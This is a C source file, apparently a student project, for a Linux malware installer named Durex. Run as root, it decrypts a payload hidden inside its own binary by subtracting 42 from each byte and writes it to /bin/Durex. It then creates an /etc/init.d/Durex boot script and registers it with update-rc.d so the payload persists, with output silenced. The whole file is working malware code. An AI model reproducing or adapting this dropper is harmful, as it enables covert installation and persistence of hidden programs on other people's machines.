#include <stdio.h>
#include <fcntl.h>
#include <errno.h>
#include <unistd.h>
#include <sys/stat.h>
#include <string.h>
#include <stdlib.h>
#include <stdbool.h>
#include <wait.h>
#include <signal.h>
#include <unistd.h>

static char	*ft_decrypt(char *buff, off_t size)
{
	off_t	i = 0;

	while (i < size)
	{
		buff[i] -= 42;
		++i;
	}
	return (buff);
}

static bool	check_root(void)
{
	if (getuid() != 0)
	{
		puts("Permission denied. Are you root ?");
		return (false);
	}
	return (true);
}

static off_t	daemon_begin(char *argv)
{
	int	fd = 0;
	off_t	size_daemon = 0;
	struct stat	st;

	fd = open(argv, O_RDONLY);
	if (fd == -1)
	{
		perror("open");
		exit(errno);
	}
	fstat(fd, &st);
	if (lseek(fd, (off_t)st.st_size - (off_t)sizeof(size_daemon), SEEK_SET) == -1)
	{
		perror("lseek");
		exit(errno);
	}
	if (read(fd, &size_daemon, sizeof(size_daemon)) < 1)
	{
		perror("read");
		exit(errno);
	}
	close(fd);
	return (size_daemon);
}

static void	install_malware(char *argv, off_t size_daemon)
{
	int	fd = 0;
	struct stat	st;

	fd = open(argv, O_RDONLY);
	if (fd == -1)
	{
		perror("open");
		exit(errno);
	}
	fstat(fd, &st);
	lseek(fd, size_daemon, SEEK_SET);

	char	buff[st.st_size - size_daemon];
	memset(&buff, 0, sizeof(buff));

	read(fd, &buff, sizeof(buff));
	ft_decrypt(buff, (off_t)sizeof(buff));
	close(fd);
	remove("/bin/Durex");
	if ((fd = open("/bin/Durex", O_CREAT | O_RDWR, 0744)) == -1)
	{
		perror("open");
		exit (errno);
	}
	write(fd, &buff, sizeof(buff));
	close(fd);
}

static void	install_init_d()
{
	char	*init_d[] = {	"#!/bin/sh\n",
							"  case \"$1\" in\n",
							"    start)\n",
							"      /bin/Durex",
							"      ;;\n",
							"    stop)\n",
							"      killall Durex\n",
							"      ;;\n",
							"    *)\n",
							"      echo \"Usage: /etc/init.d/Durex {start|stop|restart}\"\n",
							"      exit 1\n",
							"      ;;\n",
							"esac\n\n",
							"/usr/sbin/service Durex restart\n",
							"exit 0\n",
							NULL};
	int	fd = 0;
	int	pid = 0;
	char	*exec[] = {"/usr/sbin/update-rc.d", "Durex", "defaults", NULL};

	fd = open("/etc/init.d/Durex", O_RDWR | O_CREAT | O_TRUNC, 0755);
	if (fd == -1)
	{
		perror("open");
		exit(errno);
	}
	for (int i = 0; init_d[i]; i++)
		write(fd, init_d[i], strlen(init_d[i]));
	close(fd);

	pid = fork();
	if (pid == -1)
	{
		perror("fork");
		exit(errno);
	}
	else if (pid == 0)
	{
		close(STDOUT_FILENO);
		close(STDIN_FILENO);
		close(STDERR_FILENO);
		execve(exec[0], exec, NULL);
	}
	else
	{
		waitpid(pid, 0, 0);
		kill(pid, SIGTERM);
	}
}

int	main(int argc, char **argv)
{
	int	fd = 0;
	off_t	size_daemon = 0;
	struct stat	st;

	if (check_root() == false)
		return (false);

	puts("rabougue\nkbensado");

	size_daemon = daemon_begin(argv[0]);
	install_malware(argv[0], size_daemon);
	install_init_d();

	(void)argc;
}

//update-rc.d durex defaults
